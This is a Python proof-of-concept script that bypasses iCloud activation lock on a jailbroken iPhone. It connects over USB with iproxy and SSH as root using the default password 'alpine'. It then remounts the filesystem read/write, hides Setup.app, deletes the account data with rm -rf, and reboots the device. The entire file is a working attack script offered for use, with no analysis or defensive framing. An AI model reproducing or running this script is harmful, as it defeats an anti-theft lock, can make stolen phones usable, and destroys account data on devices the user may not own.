"""
iCloud Locked Phone bypass PoC
you need to get the SSH server on your iDevice running first
"""
import subprocess
import paramiko

RPORT = 44
LPORT = 2222
password = "alpine"

iproxy = subprocess.Popen(["iproxy", str(LPORT), str(RPORT)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
print("Initiating SSH connection")
while True:
    try:
        ssh.connect('localhost', username='root', password=password, port=LPORT)
        break
    except:
        print("Failed, retrying")
        continue
print("Connection established")
print("Mounting filesystem as read/write")
ssh.exec_command("mount -o rw,union,update /")
print("Cleaning mount_rw file")
ssh.exec_command('echo "" > /.mount_rw')
print("Hiding Setup.app")
ssh.exec_command("mv /Application/Setup.app /Application/Setup.app.backup")
print("Clearing UI cache")
ssh.exec_command("uicache --all")
print("Clearing iCloud user")
ssh.exec_command("rm -rf /var/mobile/Library/Accounts/*")
print("Respringing device")
ssh.exec_command("killall backboardd")
print("Finishing exploit script")
print("Restarting your device")
ssh.exec_command("reboot")
iproxy.terminate()
iproxy.kill()
